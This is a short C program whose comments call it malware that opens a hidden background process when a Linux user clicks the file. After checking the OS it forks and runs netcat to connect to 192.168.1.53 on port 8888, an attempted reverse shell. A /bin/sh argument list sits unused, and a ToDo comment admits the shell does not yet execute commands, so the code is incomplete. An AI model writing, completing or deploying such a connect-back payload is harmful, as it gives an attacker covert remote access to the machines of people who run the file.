// this malware is intended to open a hidden background process when user click on the file
// the program is designed for Linux OSs
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

int main(){
    struct utsname buffer; // declare the variable to store OS info
    if(uname(&buffer) == 0){
        if(strcmp(buffer.sysname, "Linux") == 0){
            printf("Linux OS detected\n");
            pid_t pid = fork(); // fork to create a child process
            if(pid == -1){
                perror("Fork failed");
                exit(1);
            }
            if(pid == 0){
                char *args[] = {"nc", "192.168.1.53", "8888", NULL};
                char *shell_args[] = {"/bin/sh", NULL}; // ToDo: fix the reverse shell to be able executing commands
                execvp(args[0], args);
                perror("exec failed");
                exit(1);
            }
        }else{printf("Not a Linux OS\n");}
    }else{perror("Error retrieving system info\n");}
    return 0;
}